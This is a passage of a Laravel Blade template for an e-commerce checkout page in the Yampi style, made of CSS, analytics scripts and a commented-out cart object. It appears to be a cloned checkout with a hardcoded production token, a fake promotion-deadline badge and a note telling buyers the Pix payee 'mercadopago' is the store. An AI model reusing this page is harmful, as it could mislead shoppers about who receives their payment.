y(e,t){e.on(t,(function(){this[t]=(0,m.z)()}))}this.ee.on(Pe,v),s.on(Ie,v),a.on(Ie,v),this.ee.on(ke,b),s.on(je,b),a.on(je,b),this.ee.buffer([Pe,ke,"xhr-resolved"],this.featureName),d.buffer([Pe],this.featureName),c.buffer(["setTimeout"+Se,"clearTimeout"+Ne,Pe],this.featureName),u.buffer([Pe,"new-xhr","send-xhr"+Ne],this.featureName),f.buffer([Ce+Ne,Ce+"-done",Ce+Oe+Ne,Ce+Oe+Se],this.featureName),l.buffer(["newURL"],this.featureName),g.buffer([Pe],this.featureName),s.buffer(["propagate",Ie,je,"executor-err","resolve"+Ne],this.featureName),o.buffer([Pe,"no-"+Pe],this.featureName),a.buffer(["new-jsonp","cb-start","jsonp-error","jsonp-end"],this.featureName),y(f,Ce+Ne),y(f,Ce+"-done"),y(a,"new-jsonp"),y(a,"jsonp-end"),y(a,"cb-start"),l.on("pushState-end",p),l.on("replaceState-end",p),window.addEventListener("hashchange",p,(0,j.m$)(!0,this.removeOnAbort?.signal)),window.addEventListener("load",p,(0,j.m$)(!0,this.removeOnAbort?.signal)),window.addEventListener("popstate",(function(){p(0,i>1)}),(0,j.m$)(!0,this.removeOnAbort?.signal)),this.abortHandler=this.#e,this.importAggregator()}#e(){this.removeOnAbort?.abort(),this.abortHandler=void 0}}],loaderType:"spa"})})(),window.NRBA=o})();</script>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <!-- open graph -->
    <meta property="og:title" content="{{ $data['nm_loja'] }}">
    <meta a_hash="h_checkout" hash="{{ $data['hash'] }}">
    <meta property="og:image" content="https://cdn.yampi.me/favicon/favicon.png">
    <meta property="og:type" content="website">

    <meta name="robots" content="noindex,nofollow">

    <link href="//awesome-assets.yampi.me" rel="dns-prefetch">
    <link href="//cdn.yampi.me" rel="dns-prefetch">
    <link href="//fonts.dooki.com.br" rel="dns-prefetch">
    <link href="//analytics.bubbstore.com" rel="dns-prefetch">
    <link href="//fonts.googleapis.com" rel="dns-prefetch">
    <link href="//www.google-analytics.com" rel="dns-prefetch">
    <link href="//www.googleadservices.com" rel="dns-prefetch">
    <link href="//googleads.g.doubleclick.net" rel="dns-prefetch">
    <link href="//bat.bing.com" rel="dns-prefetch">
    <link href="//connect.facebook.net" rel="dns-prefetch">
    <link href="//staticxx.facebook.com" rel="dns-prefetch">
    <link href="//static.xx.fbcdn.net" rel="dns-prefetch">
    <link href="//buyer.yampi.io" rel="dns-prefetch">

    <link rel="shortcut icon" href="https://s3.sa-east-1.amazonaws.com/king-assets.yampi.me/dooki/6456c479e97e8/6456c479e97ee.png" />
    <link rel="icon" type="image/png" href="https://s3.sa-east-1.amazonaws.com/king-assets.yampi.me/dooki/6456c479e97e8/6456c479e97ee.png" />
    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://s3.sa-east-1.amazonaws.com/king-assets.yampi.me/dooki/6456c479e97e8/6456c479e97ee.png" />
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://s3.sa-east-1.amazonaws.com/king-assets.yampi.me/dooki/6456c479e97e8/6456c479e97ee.png" />
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://s3.sa-east-1.amazonaws.com/king-assets.yampi.me/dooki/6456c479e97e8/6456c479e97ee.png" />

    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>

    <!-- webfonts -->
    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&amp;display=swap" rel="stylesheet" media="screen">
    <link href="https://fonts.dooki.com.br/fa/4.7.0/fa.css" rel="stylesheet">

    <link rel="stylesheet" href="//awesome-assets.yampi.me/checkout/build/mix/assets/css/app.css?id=fba2bbd834e778e3920356ae5d860e45">

    <title>Finalizar compra - {{$data['nm_loja']}}</title>

    <!-- Personalization variables -->
    <style>
        input[type="radio"] {
            width: 15px !important;
            height: 14px !important;
            background: white !important;
            padding: 0px !important;
        }

        :root {
            --default-radius: 30px;

            /* Fonts */
            --texts-font-family: Rubik, sans-serif;
            --titles-font-family: Rubik, sans-serif;
            --titles-uppercase: initial;
            --btn-uppercase: initial;

            /* Font weights */
            --texts-font-regular: 400;
            --texts-font-medium: 500;
            --texts-font-bold: 700;

            --titles-font-regular: 400;
            --titles-font-medium: 500;
            --titles-font-bold: 700;

            /* buttons */
            --btn-primary-bg-color: #f18000;
            --btn-primary-txt-color: #FFFFFF;
            --btn-secondary-bg-color: #999999;
            --btn-secondary-txt-color: #FFFFFF;
            --btn-tertiary-txt-color: {{$data['cor_loja']}};

            /* header and stopwatch */
            --stopwatch-txt-color: #FFFFFF;
            --stopwatch-timer-color: #FFC926;
            --stopwatch-bg-color: #773CBC;
            --header-bg-color: #773CBC;
            --header-el-color: #ffffff;

            /* discount-tag */
            --discount-tag-bg-color: {{$data['cor_loja']}};
            --discount-tag-txt-color: #FFFFFF;

            /* step-tag */
            --step-tag-bg-color: #333333;
            --step-tag-txt-color: #FFFFFF;

            --desktop-active-color: #999999;
            --cart-total-color: #f18000;
            --title-color: #666666;
            --description-color: #666666;

            /* footer */
            --footer-border-color: #d0d0d0;
            --footer-bg-color: #F7F7F8;
            --footer-txt-color: #666666;
            --footer-mobile-position: center;

        }


        .openSansText {
            font-family: 'Open Sans', sans-serif;
            color: black;
            font-size: 13px;
            line-height: 20px;
        }

        .boldText {
            font-weight: 700;
        }

        .black_back {
            position: fixed;
            background: rgba(0, 0, 0, 0.2) left top;
            width: 100%;
            height: 100%;
            z-index: 99;
            top: 0;
            left: 0;
        }

        /* don't include above in final! */

        .modal_mobile {
            width: 280px;
            position: fixed;
            padding: 30px 0 0 0;
            background-color: #fff;
            z-index: 100;
            border-radius: 5px;
            left: 50%;
            margin-left: -140px;
            top: 50%;
            margin-top: -93px;
        }

        .modal_mobile div.title.openSansText.boldText {
            font-size: 20px;
            text-align: center;
        }

        .modal_mobile .content {
            font-size: 14px;
            text-align: center;

        }

        .modal_mobile .button {
            border-top: 1px solid #E9E9E9;
            font-size: 16px;
            color: #3d7ac3;
            line-height: 44px;
            text-align: center;
            width: 100%;
            margin-top: 20px;
        }
    </style>

    <!-- Custom css -->
    <style>
        @if($data['ultimo_dia'])
            .holder-cols-checkout .holder-container-resume .item-holder-quantity-price::after {
                content: "ÚLTIMO DIA DE PROMOÇÃO";
                font-size: 11px;
                padding: 3px 5px;
                color: #fff;
                font-weight: 600;
                background: #4fc65f;
                border-radius: 5px;
                display: inline-block;
                align-self: end;
            }
        @endif

        header .holder-logo .logo .img-logo {
            display: block;
            max-height: 61px;
            max-width: var(--logo-max-width, 165px);
            -o-object-fit: contain;
            object-fit: contain;
            width: 100%;
            margin-right: 38px;
        }

        .checkout-step.enabled .connect, .checkout-step.enabled .holder-icon {
            background: linear-gradient(0deg, #004AAD 0%, #41ADFA 100%);
        }

        li.checkout-step:nth-child(1) > div:nth-child(2):after {
            content: "";
            text-indent: -1px;
            display: block;
            color: #004AAD;
            line-height: 0;
            margin-top: -12px;
            background: url("https://cdn.shopify.com/s/files/1/0521/6514/8855/files/user_white.svg?v=1661427489") no-repeat center center;
            height: 20px;
        }

        .checkout-step .holder-icon {
            width: 40px;
            height: 40px;
            background: #fff; /* circulo de informações, frete e pagamento */
            border: 2px solid #fff; /* cor da borda dos circulos */
            color: #004AAD; /* cor do texto */
            margin-bottom: 6px;
            text-indent: -9999px;
        }

        .checkout-step.enabled .connect, .checkout-step.enabled .holder-icon {
            background: linear-gradient(0deg, #f18000 0%, #f18000 100%); /* cor dos 3 icones */
        }

        .checkout-step .connect {
            background-color: #004AA; /* cor dos circulos apagados */
            top: 22px;
        }

        li.checkout-step:nth-child(2) > div:nth-child(2):after {
            height: 26px;
            background: url("https://cdn.shopify.com/s/files/1/0521/6514/8855/files/truck_grey_575052cb-447b-42a4-a4fd-a4574d0c71ec.svg?v=1661428281") no-repeat center center;
            content: "";
            text-indent: -1px;
            display: block;
            color: #000;
            line-height: 0;
            margin-top: -15px;
            margin-left: 2px;
        }

        li.checkout-step.enabled:nth-child(2) > div:nth-child(2):after {
            content: "";
            background: url("https://cdn.shopify.com/s/files/1/0521/6514/8855/files/truck_white.svg?v=1661428373") no-repeat center center; /* imagem frete branca */
        }

        li.checkout-step:nth-child(3) > div:nth-child(2):after {
            height: 26px;
            background: url("https://cdn.shopify.com/s/files/1/0521/6514/8855/files/card_grey.svg?v=1661429244") no-repeat center center;
            content: ""; /* imagem pagamento */
            text-indent: -1px;
            display: block;
            color: #000;
            line-height: 0px;
            margin-top: -15px;
            margin-left: 0;
        }

        li.checkout-step.enabled:nth-child(3) > div:nth-child(2):after {
            content: "";
            background: url("https://cdn.shopify.com/s/files/1/0521/6514/8855/files/card_white.svg?v=1661429244") no-repeat center center; /* imagem pagamento branca */
        }

        .holder-countdown::after {
            content: "";
            display: block;
            background: linear-gradient(to right, {{$data['cor_loja']}} 0, #ffffff 4%, {{$data['cor_loja']}} 5%, #ffffff 50%, {{$data['cor_loja']}} 84%, #ffffff 119%);
            height: 5px;
            width: 100%;
            position: relative;
            top: 10px;
        }

        .holder-countdown {
            padding: 9px 0 !important;
            font-size: 16px !important;
        }

        .option.clearfix {
            background-image: url(https://www.propeg.com.br/ad-viewer/Correios/Integrada/macbook.png) !important;
            background-size: 27px !important;
            content: "" !important;
            background-repeat: no-repeat !important;
            background-position-x: 145px !important;
            background-position-y: 90% !important;
        }

        .holder-cols-checkout .cart-resume .detail.total .value {
            font-size: 22px;
        }

        .payments .payment > label {
            position: relative;
            display: flex;
        }

        .payments .payment > label[for="payment-pix"]:after {
            background: #11a405;
            right: 15px !important;
            display: block;
            line-height: inherit;
            color: #FFF;
            padding: 5px 8px;
            border-radius: 8px;
            position: absolute;
            font-weight: bold;
            font-size: 10px;
            right: 3px;
            letter-spacing: 0.03em;
            top: 26%;
            content: 'APROVAÇÃO IMEDIATA';
        }

        .payments .payment > label[for="payment-credit-card"]:after {
            background: #11a405;
            right: 15px !important;
            display: block;
            line-height: inherit;
            color: #FFF;
            padding: 5px 8px;
            border-radius: 8px;
            position: absolute;
            font-weight: bold;
            font-size: 10px;
            right: 3px;
            letter-spacing: 0.03em;
            content: 'APROVAÇÃO IMEDIATA';
            top: 13%;
        }

        .payments .payment > label[for="payment-billet"]:after {
            background: #999;
            display: block;
            line-height: inherit;
            color: #FFF;
            padding: 8px 12px;
            border-radius: 8px;
            position: absolute;
            font-weight: bold;
            font-size: 10px;
            right: 3px;
            letter-spacing: 0.03em;
            top: 26%;
            content: 'APROVAÇÃO EM 3 DIAS';
        }

        .jp-card .jp-card-front .jp-card-shiny, .jp-card .jp-card-back .jp-card-shiny {
            width: 50px;
            height: 35px;
            border-radius: 5px;
            background: #CCC;
            position: relative;
            opacity: 0;
        }

        .jp-card .jp-card-front {
            background: url("https://cdn.shopify.com/s/files/1/0294/0374/2339/files/card-front.png?v=1618002695") no-repeat !important;
        }

        .jp-card .jp-card-back {
            background: url("https://cdn.shopify.com/s/files/1/0294/0374/2339/files/card-back.png?v=1618002712") no-repeat !important;
            background-size: 100% !important;
        }

        .jp-card .jp-card-back::after {
            opacity: 0 !important;
        }

        .jp-card .jp-card-back .jp-card-bar {
            opacity: 0 !important;
        }

        .jp-card .jp-card-back .jp-card-cvc {
            top: 52% !important;
            left: 80% !important;
            color: #000 !important;
        }

        .jp-card.jp-card-mastercard.jp-card-identified .jp-card-front::before, .jp-card.jp-card-mastercard.jp-card-identified .jp-card-back::before {
            background: transparent !important;
        }

        .jp-card.jp-card-safari.jp-card-identified .jp-card-front::before, .jp-card.jp-card-safari.jp-card-identified .jp-card-back::before {
            background-image: none !important;
        }

        .jp-card.jp-card-identified .jp-card-front::before, .jp-card.jp-card-identified .jp-card-back::before {
            background-image: none !important;
        }

        .jp-card.jp-card-identified .jp-card-back, .jp-card.jp-card-identified .jp-card-front {
            background-color: transparent !important;
        }

        .holder-recomm {
            border: 2px dashed var(--main-color);
        }

        .orderbump {
            background-color: #fff5ee;
        }

        .owl-orderbumps .owl-dots .owl-dot.active span {
            background-color: var(--main-color) !important;
        }

        .orderbumps_offer-title, .orderbumps_offer-total {
            color: var(--main-color) !important;
            background-color: #FFF;
        }

        .orderbump_price {
            color: #1bb794 !important;
        }

        .orderbump_button {
            background-color: #f79f1a !important;
        }

        .orderbump_disclaimer {
            padding-top: 18px;
            display: none;
        }

        .orderbump_button {
            padding: 13px 10px 9px;
        }

        .orderbump {
            border-radius: 15px;
        }

        .holder-cols-checkout .box-checkout {
            border: 1px solid transparent;
        }

        .holder-cols-checkout .box-checkout.box-resume {
            width: auto;
            margin: 0 -1px 20px;
            padding-left: 14px;
            padding-right: 14px;
            border: 0;
            box-shadow: none;
            border-radius: 6PX;
            box-shadow: 0 1px 4px 0 rgb(0 0 0 / 17%);
        }

        .btn-text.btn-purple {
            color: #ffffff;
            background: #bdbdbd;
            border-radius: 25PX;
        }

        .col-checkout:not(.col-3) .box-checkout.active:not(.upsell) {
            width: auto;
            border: 0;
            box-shadow: none;
            border-radius: 6PX;
            box-shadow: 0 1px 4px 0 rgb(0 0 0 / 17%);
        }

        .container-testimonials .testimonials {
            padding: 20px 21px;
            background: #FFF;
            border-radius: 6PX;
            box-shadow: 0 1px 4px 0 rgb(0 0 0 / 17%);
            width: auto;
            margin: 0 -8px 20px;
            padding-left: 14px;
            padding-right: 14px;
            box-sizing: border-box;
        }

        .container-testimonials {
            max-width: 680px !important;
            box-shadow: 0 4px 12px rgb(244 246 248);
        }

        .holder-cols-checkout .box-checkout.active .title {
            color: {{$data['cor_loja']}}    !important;
        }

        .holder-cols-checkout .box-checkout.box-resume {
            width: auto;
            margin: 0 -1px 20px;
            padding-left: 14px;
            padding-right: 14px;
            border: 0;
            box-shadow: none;
            border-radius: 6PX;
            box-shadow: 0 1px 4px 0 rgb(0 0 0 / 17%);
        }

        .btn-text.btn-purple {
            color: #ffffff;
            background: #bdbdbd;
            border-radius: 25PX;
        }

        .col-checkout:not(.col-3) .box-checkout.active:not(.upsell) {
            width: auto;
            border: 0;
            box-shadow: none;
            border-radius: 6PX;
            box-shadow: 0 1px 4px 0 rgb(0 0 0 / 17%);
        }

        .container-testimonials .testimonials {
            padding: 20px 21px;
            background: #FFF;
            border-radius: 6PX;
            box-shadow: 0 1px 4px 0 rgb(0 0 0 / 17%);
            width: auto;
            margin: 0 -8px 20px;
            padding-left: 14px;
            padding-right: 14px;
            box-sizing: border-box;
        }

        .container-testimonials {
            max-width: 680px !important;
            box-shadow: 0 4px 12px rgb(244 246 248);
        }

        .holder-cols-checkout .box-checkout .box-title .desc {
            font-family: 'Roboto', sans-serif;
            line-height: 1.4;
            font-size: 13.5px;
        }

        .holder-cols-checkout .cart-resume .detail.total .value:after {
            content: 'à vista';
            color: #4b4b4b !important;
            display: block;
            font-weight: 400;
            font-size: 12px;
        }

        .mobile-description > div:nth-child(2) > span:nth-child(1) {
            color: #367eff !important;
        }

        .-description::after {
            content: "O nome do favorecido do PIX é mercadopago. Essa é o nome da nossa empresa recebedora do pagamento.";
            font-size: 12px;
            color: #367eff;
            border: 1px solid #367eff;
            background: transparent;
            padding: 10px;
            display: block;
            border-radius: 5px;
            margin: 20px auto;
        }

        .holder-cols-checkout .box-checkout.active .box-title .holder-number {
            background: linear-gradient(0deg, {{$data['cor_loja']}} 0%, {{$data['cor_loja']}} 100%);
            border-radius: 20%;
        }

        .checkout-step .holder-icon {
            border-radius: 20%;
        }

        .btn-copy-paste {
            background-color: #004AAD;
        }

        .mt25.mb10::before {
            content: '';
            background: url(https://cdn.shopify.com/s/files/1/0621/5273/7018/files/COMO_PAGAR_SEU_PIX.png?v=1682297441);
            background-size: 100%;
            background-repeat: no-repeat;
            background-position: center;
            width: 130%;
            margin-left: -35px;
            margin-top: -54px;
            height: 367px;
            display: flex;
            position: relative;
            align-items: center;
            padding: 0 !important;
            margin-bottom: -185px;
        }

        .finalization-pix .qr-code .-holder, .finalization-wallet .qr-code .-holder {
            margin: 0 0 15px;
        }
    </style>

    <script>
        window.TOKEN = 'FIa4DC6c2dzKQYTFe8x0rKxYsEsGonB2IQs4fldb';
        window.ENV = 'production';
        window.checkout = window.checkout || {};
        window.session = {
            upsell: false,
            page: 'checkout-payment',
            auth: {
                name: '{{$data['nome_completo']}}',
                email: '{{$data['email']}}'
            },
            customer: {
                name: '',
                email: ''
            },
            flux: {
                hit: '',
                vid: ''
            },
            sender_hash: ''
        }
        window.merchant = {
            id: 586266
        }
        window.config = {
            payment_auto_selected: 'credit_card',
            select_largest_installment: 1,
            show_installment_warning: 0
        }
    </script>

    <script>
        // Removes query params from url
        if ("undefined" !== typeof history.replaceState && 'undefined' !== typeof URL) {
            var newUrl = new URL(window.location.href);

            newUrl.searchParams.delete('store_token');
            newUrl.searchParams.delete('cart_token');

            if (window.location.href !== newUrl.href) {
                history.replaceState({}, null, newUrl.href);
            }
        }
    </script>

    <script>
        window.yampi = window.yampi || {};
        window.yampi = Object.assign(window.yampi, {
            google: {
                analytics: {
                    version: [],
                }
            }
        });
    </script>

    <script>
        (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r;
            i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date();
            a = s.createElement(o),
                m = s.getElementsByTagName(o)[0];
            a.async = 1;
            a.src = g;
            m.parentNode.insertBefore(a, m)
        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

        ga('create', 'UA-231467125-1', 'auto');

        ga('send', 'pageview');

        // Internal tracker
        ga('create', 'UA-45745009-5', {name: 'bubbTracker'});
        ga('create', 'UA-45745009-32', {name: 'checkout'});

        ga('bubbTracker.send', 'pageview');
        ga('bubbTracker.require', 'ecommerce', 'ecommerce.js');

        ga('checkout.send', 'pageview');
        ga('checkout.require', 'ecommerce', 'ecommerce.js');

        window.yampi.google.analytics.version.push('universal');
    </script>

{{--    <script>--}}
{{--        window.checkout.cart = {--}}
{{--            id: 351260355,--}}
{{--            customer_id: 148572890,--}}
{{--            token: 'shopify-335233c33b52253e2e48f95bcaa3301c',--}}
{{--            optionsIds: ['8450500755761'],--}}
{{--            skusIds: ['121671212'],--}}
{{--            isShopify: true,--}}
{{--            prices: {--}}
{{--                "items_amount": 249.8,--}}
{{--                "total_items": "1",--}}
{{--                "subtotal": 79,--}}
{{--                "discount": 0,--}}
{{--                "items_discount": 170.8,--}}
{{--                "shipment": 0,--}}
{{--                "shipment_original_value": "0.00",--}}
{{--                "shipment_discount_value": 0,--}}
{{--                "shipment_discount_percent": "0,00",--}}
{{--                "promocode_discount_value": 0,--}}
{{--                "progressive_discount_value": 0,--}}
{{--                "kits_discount_value": 0,--}}
{{--                "total": 79,--}}
{{--                "value_for_free_shipment": 0,--}}
{{--                "installments": {--}}
{{--                    "max_installment": 12,--}}
{{--                    "max_installment_value": 7.93,--}}
{{--                    "amount": 95.18,--}}
{{--                    "text": "12x de R$ 7,93 *",--}}
{{--                    "text_with_tax": "12x de R$ 7,93",--}}
{{--                    "text_discount_percent": null,--}}
{{--                    "text_discount": null,--}}
{{--                    "installments": [{--}}
{{--                        "amount": 79,--}}
{{--                        "amount_formated": "R$ {{str_replace('.',',',$data['preco'])}}",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "0.00",--}}
{{--                        "tax_value": 0,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": 0,--}}
{{--                        "discount_value_formated": "R$ 0,00",--}}
{{--                        "installment": 1,--}}
{{--                        "installment_value": 79,--}}
{{--                        "installment_value_formated": "R$ {{str_replace('.',',',$data['preco'])}}",--}}
{{--                        "text": "1x de R$ {{str_replace('.',',',$data['preco'])}}",--}}
{{--                        "text_with_tax": "1x de R$ {{str_replace('.',',',$data['preco'])}}",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 82.56,--}}
{{--                        "amount_formated": "R$ 82,56",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 3.560546618059931,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -3.56,--}}
{{--                        "discount_value_formated": "R$ -3,56",--}}
{{--                        "installment": 2,--}}
{{--                        "installment_value": 41.28,--}}
{{--                        "installment_value_formated": "R$ 41,28",--}}
{{--                        "text": "2x de R$ 41,28 *",--}}
{{--                        "text_with_tax": "2x de R$ 41,28",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 83.77,--}}
{{--                        "amount_formated": "R$ 83,77",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 4.770587626636498,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -4.77,--}}
{{--                        "discount_value_formated": "R$ -4,77",--}}
{{--                        "installment": 3,--}}
{{--                        "installment_value": 27.92,--}}
{{--                        "installment_value_formated": "R$ 27,92",--}}
{{--                        "text": "3x de R$ 27,92 *",--}}
{{--                        "text_with_tax": "3x de R$ 27,92",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 84.99,--}}
{{--                        "amount_formated": "R$ 84,99",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 5.992217995627527,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -5.99,--}}
{{--                        "discount_value_formated": "R$ -5,99",--}}
{{--                        "installment": 4,--}}
{{--                        "installment_value": 21.25,--}}
{{--                        "installment_value_formated": "R$ 21,25",--}}
{{--                        "text": "4x de R$ 21,25 *",--}}
{{--                        "text_with_tax": "4x de R$ 21,25",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 86.23,--}}
{{--                        "amount_formated": "R$ 86,23",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 7.225430687253976,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -7.23,--}}
{{--                        "discount_value_formated": "R$ -7,23",--}}
{{--                        "installment": 5,--}}
{{--                        "installment_value": 17.25,--}}
{{--                        "installment_value_formated": "R$ 17,25",--}}
{{--                        "text": "5x de R$ 17,25 *",--}}
{{--                        "text_with_tax": "5x de R$ 17,25",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 87.47,--}}
{{--                        "amount_formated": "R$ 87,47",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 8.470216660416938,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -8.47,--}}
{{--                        "discount_value_formated": "R$ -8,47",--}}
{{--                        "installment": 6,--}}
{{--                        "installment_value": 14.58,--}}
{{--                        "installment_value_formated": "R$ 14,58",--}}
{{--                        "text": "6x de R$ 14,58 *",--}}
{{--                        "text_with_tax": "6x de R$ 14,58",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 88.73,--}}
{{--                        "amount_formated": "R$ 88,73",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 9.726564876290837,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -9.73,--}}
{{--                        "discount_value_formated": "R$ -9,73",--}}
{{--                        "installment": 7,--}}
{{--                        "installment_value": 12.68,--}}
{{--                        "installment_value_formated": "R$ 12,68",--}}
{{--                        "text": "7x de R$ 12,68 *",--}}
{{--                        "text_with_tax": "7x de R$ 12,68",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 89.99,--}}
{{--                        "amount_formated": "R$ 89,99",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 10.994462305145845,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -10.99,--}}
{{--                        "discount_value_formated": "R$ -10,99",--}}
{{--                        "installment": 8,--}}
{{--                        "installment_value": 11.25,--}}
{{--                        "installment_value_formated": "R$ 11,25",--}}
{{--                        "text": "8x de R$ 11,25 *",--}}
{{--                        "text_with_tax": "8x de R$ 11,25",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 91.27,--}}
{{--                        "amount_formated": "R$ 91,27",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 12.273893934390998,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -12.27,--}}
{{--                        "discount_value_formated": "R$ -12,27",--}}
{{--                        "installment": 9,--}}
{{--                        "installment_value": 10.14,--}}
{{--                        "installment_value_formated": "R$ 10,14",--}}
{{--                        "text": "9x de R$ 10,14 *",--}}
{{--                        "text_with_tax": "9x de R$ 10,14",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 92.56,--}}
{{--                        "amount_formated": "R$ 92,56",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 13.564842777828474,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -13.56,--}}
{{--                        "discount_value_formated": "R$ -13,56",--}}
{{--                        "installment": 10,--}}
{{--                        "installment_value": 9.26,--}}
{{--                        "installment_value_formated": "R$ 9,26",--}}
{{--                        "text": "10x de R$ 9,26 *",--}}
{{--                        "text_with_tax": "10x de R$ 9,26",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 93.87,--}}
{{--                        "amount_formated": "R$ 93,87",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 14.867289886107741,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -14.87,--}}
{{--                        "discount_value_formated": "R$ -14,87",--}}
{{--                        "installment": 11,--}}
{{--                        "installment_value": 8.53,--}}
{{--                        "installment_value_formated": "R$ 8,53",--}}
{{--                        "text": "11x de R$ 8,53 *",--}}
{{--                        "text_with_tax": "11x de R$ 8,53",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }, {--}}
{{--                        "amount": 95.18,--}}
{{--                        "amount_formated": "R$ 95,18",--}}
{{--                        "base_value": 79,--}}
{{--                        "tax": "2.99",--}}
{{--                        "tax_value": 16.181214358367328,--}}
{{--                        "discount_percent": 0,--}}
{{--                        "discount_value": -16.18,--}}
{{--                        "discount_value_formated": "R$ -16,18",--}}
{{--                        "installment": 12,--}}
{{--                        "installment_value": 7.93,--}}
{{--                        "installment_value_formated": "R$ 7,93",--}}
{{--                        "text": "12x de R$ 7,93 *",--}}
{{--                        "text_with_tax": "12x de R$ 7,93",--}}
{{--                        "text_discount_percent": null,--}}
{{--                        "text_discount": null--}}
{{--                    }]--}}
{{--                },--}}
{{--                "promocode_subtotal": 79,--}}
{{--                "items_amount_formated": "R$ 249,80",--}}
{{--                "subtotal_formated": "R$ {{str_replace('.',',',$data['preco'])}}",--}}
{{--                "items_discount_formated": "R$ 170,80",--}}
{{--                "discount_formated": "R$ 0,00",--}}
{{--                "shipment_original_value_formated": "R$ 0,00",--}}
{{--                "shipment_formated": "Gr\u00e1tis",--}}
{{--                "total_format": "{{str_replace('.',',',$data['preco'])}}",--}}
{{--                "total_formated": "R$ {{str_replace('.',',',$data['preco'])}}",--}}
{{--                "value_for_free_shipment_formated": "R$ 0,00"--}}
{{--            },--}}
{{--            items: [{--}}
{{--                "id": 495561497,--}}
{{--                "cart_id": 351260355,--}}
{{--                "product_option_id": 121671212,--}}
{{--                "kit_id": null,--}}
{{--                "bundle_id": null,--}}
{{--                "upsell_id": null,--}}
{{--                "quantity": 1,--}}
{{--                "gift": 0,--}}
{{--                "created_at": "2023-05-27 17:46:53",--}}
{{--                "updated_at": "2023-05-27 17:46:53",--}}
{{--                "brand": {"id": 10957845, "name": "{{$data['nm_loja']}}", "slug": "loja-liford"},--}}
{{--                "is_in_promotional_rack": false,--}}
{{--                "custom_shipping": false,--}}
{{--                "free_shipping": false,--}}
{{--                "shipping_price": 0,--}}
{{--                "weight": 0,--}}
{{--                "product_id": 17987792,--}}
{{--                "option_id": 121671212,--}}
{{--                "link": "javascript:",--}}
{{--                "is_bundle": false,--}}
{{--                "group_name": "Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos 500g (10 Unidades) - 495561497",--}}
{{--                "bundle": {--}}
{{--                    "name": "",--}}
{{--                    "modifiable": true,--}}
{{--                    "image_url": "",--}}
{{--                    "quantity": 1,--}}
{{--                    "shipping": {"custom": false, "price": 0, "days": null, "type": null}--}}
{{--                },--}}
{{--                "small": "https:\/\/cdn.shopify.com\/s\/files\/1\/0754\/7938\/4369\/products\/1-main-rains-chuva-tortorage-packaging-ag-ag-cereals-oiosture-sect-nsect-roof-telhado-ag-ealed-ag-ag-hichickened-orortable-ood-ood-ice-gelo-ean-ean-tainer-ontainer-oozzle-ag-ag_50x50.png",--}}
{{--                "thumb": "https:\/\/cdn.shopify.com\/s\/files\/1\/0754\/7938\/4369\/products\/1-main-rains-chuva-tortorage-packaging-ag-ag-cereals-oiosture-sect-nsect-roof-telhado-ag-ealed-ag-ag-hichickened-orortable-ood-ood-ice-gelo-ean-ean-tainer-ontainer-oozzle-ag-ag_250x250.png",--}}
